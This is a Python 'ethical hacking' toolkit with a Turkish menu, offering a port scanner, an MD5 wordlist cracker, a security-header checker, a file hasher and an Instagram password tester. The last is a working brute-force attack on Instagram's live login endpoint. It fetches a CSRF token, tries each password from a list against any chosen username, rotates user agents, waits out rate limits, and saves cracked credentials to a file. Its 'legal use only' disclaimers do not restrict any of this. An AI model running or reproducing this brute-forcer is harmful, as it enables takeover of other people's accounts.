#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import socket
import hashlib
import requests
import re
import time
import random
from urllib.parse import urlparse

# Renk Kodları
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[97m'
    MAGENTA = '\033[35m'
    
    # Root prompt
    ROOT = '\033[1;31m[root@ethicalhacker]\033[0m '

# Ayarlar
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
INSTAGRAM_APP_ID = "936619743392459"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    print(f"""{Colors.CYAN}
███████╗████████╗██╗  ██╗███████╗██████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
█████╗     ██║   ███████║█████╗  ██████╔╝    ███████║███████║██║     █████╔╝ 
██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗    ██╔══██║██╔══██║██║     ██╔═██╗ 
███████╗   ██║   ██║  ██║███████╗██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{Colors.END}{Colors.MAGENTA}
╦ ╦┌─┐┬  ┌─┐┌─┐┌┬┐┌─┐  ╔╦╗┌─┐┌─┐┬  ┌─┐  ╔═╗┌─┐┌─┐┬┌─┐┌┐┌┌─┐┬─┐
║║║├┤ │  │  │ ││││├┤    ║ │ ││ ││  └─┐  ╠═╝├─┤│  ││ ││││├┤ ├┬┘
╚╩╝└─┘┴─┘└─┘└─┘┴ ┴└─┘   ╩ └─┘└─┘┴─┘└─┘  ╩  ┴ ┴└─┘┴└─┘┘└┘└─┘┴└─
{Colors.END}{Colors.YELLOW}
[*] 🛡️  Gelişmiş Etik Hacking Araç Kiti
[*] 👨‍💻 Developer: White Hat Hacker
[*] ⚠️  UYARI: Sadece yasal ve yetkili testler için kullanın!
{Colors.END}""")

def instagram_banner():
    print(f"""{Colors.MAGENTA}
██╗███╗░░██╗░██████╗████████╗░█████╗░░██████╗░██████╗░░█████╗░███╗░░░███╗
██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝░██╔══██╗██╔══██╗████╗░████║
██║██╔██╗██║╚█████╗░░░░██║░░░███████║██║░░██╗░██████╔╝███████║██╔████╔██║
██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
██║██║░╚███║██████╔╝░░░██║░░░██║░░██║╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
{Colors.END}{Colors.CYAN}
██╗░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║███████║██║░░╚═╝█████═╝░
██╔══██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
{Colors.END}{Colors.BLUE}
[*] 🚀 Gelişmiş Instagram Şifre Test Aracı  
[*] ⚠️ SORUMLULUK REDDİ: Dikkat! Sadece etik testler için kullanın
[*] 🔐 Tüm yasal sorumluluk kullanıcıya aittir
{Colors.END}""")

def random_user_agent():
    user_agents = [
        DEFAULT_USER_AGENT,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(user_agents)

def port_scanner():
    target = input(f"{Colors.ROOT}Hedef IP/domain: {Colors.END}")
    ports = input(f"{Colors.ROOT}Portlar (örn: 80,443,22,21): {Colors.END}").split(',')
    
    print(f"\n{Colors.BLUE}[*] {target} için port taraması başlatılıyor...{Colors.END}")
    for port in ports:
        try:
            port = int(port.strip())
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"{Colors.GREEN}[+] Port {port}: AÇIK{Colors.END}")
                try:
                    service = socket.getservbyport(port)
                    print(f"{Colors.CYAN}   [+] Servis: {service}{Colors.END}")
                except:
                    pass
            else:
                print(f"{Colors.RED}[-] Port {port}: KAPALI{Colors.END}")
            sock.close()
        except:
            print(f"{Colors.RED}[-] Port {port} geçersiz{Colors.END}")

def md5_bruteforce():
    md5_hash = input(f"{Colors.ROOT}MD5 hash: {Colors.END}")
    wordlist = input(f"{Colors.ROOT}Wordlist (örn: wordlist.txt): {Colors.END}")
    
    try:
        with open(wordlist, 'r', encoding='utf-8') as file:
            for word in file.readlines():
                word = word.strip()
                hashed_word = hashlib.md5(word.encode()).hexdigest()
                if hashed_word == md5_hash:
                    print(f"\n{Colors.GREEN}[+] Hash kırıldı! Şifre: {Colors.BOLD}{word}{Colors.END}")
                    return
                else:
                    print(f"{Colors.YELLOW}[-] Denenen: {word}{Colors.END}", end='\r')
        print(f"\n{Colors.RED}[-] Hash kırılamadı{Colors.END}")
    except FileNotFoundError:
        print(f"{Colors.RED}[-] Wordlist bulunamadı{Colors.END}")

def http_header_check():
    url = input(f"{Colors.ROOT}URL (örn: https://example.com): {Colors.END}")
    try:
        headers = {'User-Agent': random_user_agent()}
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        
        print(f"\n{Colors.BLUE}[*] HTTP Başlıkları:{Colors.END}")
        for key, value in response.headers.items():
            print(f"{Colors.CYAN}{key}: {Colors.WHITE}{value}{Colors.END}")
        
        security_headers = {
            'X-XSS-Protection': 'XSS koruması yok',
            'Content-Security-Policy': 'CSP başlığı yok',
            'Strict-Transport-Security': 'HSTS başlığı yok',
            'X-Frame-Options': 'Clickjacking koruması yok',
            'X-Content-Type-Options': 'MIME sniffing koruması yok'
        }
        
        print(f"\n{Colors.BLUE}[*] Güvenlik Kontrolleri:{Colors.END}")
        vulnerabilities = 0
        for header, message in security_headers.items():
            if header not in response.headers:
                print(f"{Colors.RED}[-] {message}{Colors.END}")
                vulnerabilities += 1
            else:
                print(f"{Colors.GREEN}[+] {header} mevcut{Colors.END}")
        
        if vulnerabilities == 0:
            print(f"{Colors.GREEN}[+] Tüm kritik güvenlik başlıkları mevcut!{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] {vulnerabilities} güvenlik açığı tespit edildi{Colors.END}")
            
    except Exception as e:
        print(f"{Colors.RED}[-] Hata: {str(e)}{Colors.END}")

def file_hash_calculator():
    file_path = input(f"{Colors.ROOT}Dosya yolu: {Colors.END}")
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
            md5 = hashlib.md5(data).hexdigest()
            sha1 = hashlib.sha1(data).hexdigest()
            sha256 = hashlib.sha256(data).hexdigest()
            
            print(f"\n{Colors.BLUE}[*] Hash Değerleri:{Colors.END}")
            print(f"{Colors.CYAN}MD5:    {Colors.WHITE}{md5}{Colors.END}")
            print(f"{Colors.CYAN}SHA1:   {Colors.WHITE}{sha1}{Colors.END}")
            print(f"{Colors.CYAN}SHA256: {Colors.WHITE}{sha256}{Colors.END}")
    except FileNotFoundError:
        print(f"{Colors.RED}[-] Dosya bulunamadı{Colors.END}")

def instagram_password_tester():
    instagram_banner()
    
    username = input(f"{Colors.ROOT}Instagram kullanıcı adı: {Colors.END}")
    password_file = input(f"{Colors.ROOT}Şifre listesi: {Colors.END}")
    
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}[-] Dosya bulunamadı{Colors.END}")
        return
    
    print(f"\n{Colors.BLUE}[*] {username} için {len(passwords)} şifre denenecek...{Colors.END}")
    
    session = requests.Session()
    session.headers.update({'User-Agent': random_user_agent()})
    
    try:
        # CSRF token al
        response = session.get('https://www.instagram.com/')
        csrf_token = response.cookies.get('csrftoken')
        if not csrf_token:
            print(f"{Colors.RED}[-] CSRF token alınamadı{Colors.END}")
            return
            
        # Giriş denemeleri
        for i, password in enumerate(passwords, 1):
            payload = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': csrf_token,
                'X-IG-App-ID': INSTAGRAM_APP_ID,
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            try:
                response = session.post('https://www.instagram.com/accounts/login/ajax/', 
                                    data=payload, headers=headers)
                result = response.json()
                
                if result.get('authenticated'):
                    print(f"\n{Colors.GREEN}[+] BAŞARILI! {username}:{password}{Colors.END}")
                    with open('bulunan_sifreler.txt', 'a') as f:
                        f.write(f"{username}:{password}\n")
                    return
                elif result.get('message') == 'rate limited':
                    print(f"{Colors.RED}[-] Rate limit! Bekleniyor...{Colors.END}")
                    time.sleep(60)
                else:
                    print(f"{Colors.YELLOW}[{i}/{len(passwords)}] Denenen: {password}{Colors.END}", end='\r')
                    
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"{Colors.RED}[-] Hata: {str(e)}{Colors.END}")
                
    except Exception as e:
        print(f"{Colors.RED}[-] Kritik hata: {str(e)}{Colors.END}")

def main_menu():
    while True:
        clear_screen()
        show_banner()
        print(f"""
{Colors.BOLD}1.{Colors.END} Port Tarayıcı
{Colors.BOLD}2.{Colors.END} MD5 Şifre Kırıcı
{Colors.BOLD}3.{Colors.END} Web Güvenlik Kontrolü
{Colors.BOLD}4.{Colors.END} Dosya Hash Hesaplayıcı
{Colors.BOLD}5.{Colors.END} Instagram Şifre Testi
{Colors.BOLD}6.{Colors.END} Çıkış
        """)
        
        choice = input(f"{Colors.ROOT}Seçiminiz (1-6): {Colors.END}")
        
        if choice == '1':
            port_scanner()
        elif choice == '2':
            md5_bruteforce()
        elif choice == '3':
            http_header_check()
        elif choice == '4':
            file_hash_calculator()
        elif choice == '5':
            instagram_password_tester()
        elif choice == '6':
            print(f"{Colors.GREEN}[+] Çıkış yapılıyor...{Colors.END}")
            break
        else:
            print(f"{Colors.RED}[-] Geçersiz seçim!{Colors.END}")
        
        input(f"\n{Colors.BLUE}[*] Devam etmek için Enter'a basın...{Colors.END}")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[-] Program kapatıldı{Colors.END}")